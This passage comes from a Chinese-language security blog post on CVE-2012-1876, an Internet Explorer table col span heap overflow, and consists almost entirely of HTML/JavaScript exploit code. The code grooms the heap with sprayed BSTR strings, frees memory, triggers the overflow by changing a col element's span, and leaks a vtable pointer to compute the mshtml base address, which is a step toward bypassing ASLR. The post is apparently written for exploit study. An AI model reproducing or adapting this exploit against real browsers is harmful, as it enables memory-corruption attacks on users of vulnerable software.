&gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;60&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;61&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;62&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;63&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;64&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;65&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;66&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;67&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;68&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;69&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;70&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;71&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;72&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;73&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;74&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;75&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;76&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;77&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;78&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;79&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;80&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;81&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;82&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;83&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;84&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;85&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;86&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;87&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;88&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;89&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;90&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;91&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;92&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;93&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;94&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;95&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;96&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;97&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;98&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;99&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;100&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;101&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;102&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;103&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;104&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;105&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;106&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;107&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;108&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;109&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;110&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;111&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;112&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;113&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;114&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;115&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;116&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;117&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;118&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;119&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;120&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;121&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;122&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;123&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;124&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;125&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;126&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;127&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;128&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;129&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;130&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;131&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;132&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp&lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script language&#x3D;&#39;javascript&#39;&gt;      </span><br><span class="line">    var evil_col &#x3D; document.getElementById(&quot;132&quot;);  </span><br><span class="line">    evil_col.span &#x3D; &quot;19&quot;;</span><br><span class="line">    alert(&quot;over flow&quot;);</span><br><span class="line">    </span><br><span class="line">    var leak_addr&#x3D;-1;</span><br><span class="line">    for(var i &#x3D; 0;i&lt;500;i++)&#123;       </span><br><span class="line">        if(arr[i].length&gt;(0x100-6)&#x2F;2)&#123;</span><br><span class="line">            leak_index&#x3D;i;</span><br><span class="line">            var leak&#x3D;arr[i].substring((0x100-6)&#x2F;2+(2+8)&#x2F;2,(0x100-6)&#x2F;2+(2+8+4)&#x2F;2);</span><br><span class="line">            leak_addr &#x3D; parseInt(leak.charCodeAt(1).toString(16)+leak.charCodeAt(0).toString(16),16);</span><br><span class="line">            alert(leak_addr.toString(16));</span><br><span class="line">            leak_addr&#x3D;leak_addr-Number(0x001584f8);</span><br><span class="line">            alert(leak_addr.toString(16));</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>


<p>精简后的exploit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;test&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">	var leak_index&#x3D;-1;</span><br><span class="line">	var dap&#x3D;&quot;EEEE&quot;;</span><br><span class="line">	while(dap.length&lt;480) dap+&#x3D;dap;</span><br><span class="line">	var padding&#x3D;&quot;AAAA&quot;;</span><br><span class="line">	while(padding.length&lt;480) padding+&#x3D;padding;</span><br><span class="line">	var filler&#x3D;&quot;BBBB&quot;;</span><br><span class="line">	while(filler.length&lt;480) filler+&#x3D;filler;</span><br><span class="line"></span><br><span class="line">	var arry1&#x3D;new Array();</span><br><span class="line">	var arry2&#x3D;new Array();</span><br><span class="line"></span><br><span class="line">	var div_container&#x3D;document.getElementById(&quot;test&quot;);</span><br><span class="line">	div_container.style.cssText&#x3D;&quot;display:none&quot;;</span><br><span class="line"></span><br><span class="line">	for(var i&#x3D;0;i&lt;500;i+&#x3D;2)</span><br><span class="line">	&#123;</span><br><span class="line">		arry1[i]&#x3D;dap.substring(0,(0x100-6)&#x2F;2) &#x2F;&#x2F;减去BSTR的头部4+结尾2字节，因为unicode编码除2</span><br><span class="line">		arry2[i]&#x3D;padding.substring(0,(0x100-6)&#x2F;2)</span><br><span class="line">		arry2[i+1]&#x3D;filler.substring(0,(0x100-6)&#x2F;2)</span><br><span class="line">		Math.tan(1,2)</span><br><span class="line">		var obj&#x3D;document.createElement(&quot;button&quot;);</span><br><span class="line">		div_container.appendChild(obj);</span><br><span class="line">	&#125;</span><br><span class="line">	for(var i&#x3D;200;i&lt;500;i+&#x3D;2)</span><br><span class="line">	&#123;</span><br><span class="line">		arry1[i]&#x3D;null;</span><br><span class="line">		CollectGarbage();</span><br><span class="line">	&#125;</span><br><span class="line">	Math.cos(1,2)</span><br><span class="line"> for (var i&#x3D;200; i&lt;500; i+&#x3D;2 ) &#123;</span><br><span class="line">            arry1[i] &#x3D; null;</span><br><span class="line">            CollectGarbage();</span><br><span class="line">        &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"> &lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;</span><br><span class="line">        &lt;col id&#x3D;&quot;132&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt;&amp;nbsp &lt;&#x2F;col&gt;</span><br><span class="line"> &lt;&#x2F;table&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"> Math.sin(1,2)</span><br><span class="line"> &#x2F;&#x2F;1.Overflow</span><br><span class="line"></span><br><span class="line"> var obj_col &#x3D; document.getElementById(&quot;132&quot;);</span><br><span class="line">        &#x2F;&#x2F;obj_col.width &#x3D; &quot;41&quot;;</span><br><span class="line"> obj_col.span &#x3D; &quot;19&quot;;</span><br><span class="line"> alert(&quot;overflow&quot;)</span><br><span class="line"> Math.tan()</span><br><span class="line"> &#x2F;&#x2F;2.Leak address</span><br><span class="line"> for(var i&#x3D;0;i&lt;500;i++)</span><br><span class="line"> &#123;</span><br><span class="line">       if(arry2[i].length&gt;(0x100-6)&#x2F;2)</span><br><span class="line">        &#123;</span><br><span class="line">        		leak&#x3D;arry2[i].substring((0x100-6)&#x2F;2+(2+20)&#x2F;2,(0x100-6)&#x2F;2+(2+20+4)&#x2F;2)</span><br><span class="line">        		leak_addr &#x3D; parseInt(leak.charCodeAt(1).toString(16)+leak.charCodeAt(0).toString(16),16);</span><br><span class="line">            	alert(&quot;vrftable&#x3D;&quot;+leak_addr.toString(16));</span><br><span class="line"></span><br><span class="line">            	mshtml_addr&#x3D;leak_addr-Number(0x00158690);</span><br><span class="line">            	alert(&quot;mshtml_addr&#x3D;&quot;+mshtml_addr.toString(16));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> &lt;&#x2F;script&gt;</span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line"> &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Migraine殇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://migraine-sudo.github.io/2019/12/01/CVE-2012-1876/">https://migraine-sudo.github.io/2019/12/01/CVE-2012-1876/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://migraine-sudo.github.io" target="_blank">Migraine殇</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Exploit/">Exploit</a></div><div class="post_share"><div class="social-share" data-image="/img/XsPKP4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/12/20/qwn2own/"><img class="prev-cover" src="/img/MYzR3f.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">JS Engine Exploit-qwn2own</div></div></a></div><div class="next-post pull-right"><a href="/2019/11/25/how2heap2/"><img class="next-cover" src="/img/%E5%A0%86%E5%88%A9%E7%94%A8.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">How2Heap堆利用学习笔记(二)consolidate</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2019/10/22/HeapSpray/" title="HeapSpray入门"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/heap2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-22</div><div class="title">HeapSpray入门</div></div></a></div><div><a href="/2019/10/18/Win-exploitS-E-H/" title="Windows下漏洞利用 S.E.H深入分析"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/J9yzMy.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-18</div><div class="title">Windows下漏洞利用 